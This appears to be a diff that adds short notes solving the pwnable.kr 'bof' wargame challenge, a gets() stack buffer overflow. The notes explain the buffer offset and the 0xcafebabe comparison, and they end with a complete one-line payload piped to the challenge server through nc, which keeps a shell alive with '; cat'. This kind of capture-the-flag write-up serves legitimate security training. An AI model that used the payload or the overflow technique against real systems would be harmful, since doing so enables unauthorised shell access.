@@ -1,0 +1,9 @@
+- read input from user through gets()
+- <lea    -0x2c(%ebp),%eax> indicates the start of buf address that input will reside in
+- <cmpl   $0xcafebabe,0x8(%ebp)> compares the what's in $ebp+8 with 0xcafebabe. The original
+	content in $ebp+8 is 0xdeadbeaf. So we need to overwrite it.
+- NOTE: although system("/bin/sh") spawned a shell (forked child process) before the SSP check 
+	to prevent stack smashing, we need "; cat" to maintain the connection to the remote server 
+	so that we can pass more commands to it. Otherwise, the child process will halt like never 
+	existed...
+- A: (python -c "print '\xbe\xba\xfe\xca' * 14"; cat) | nc pwnable.kr 9000
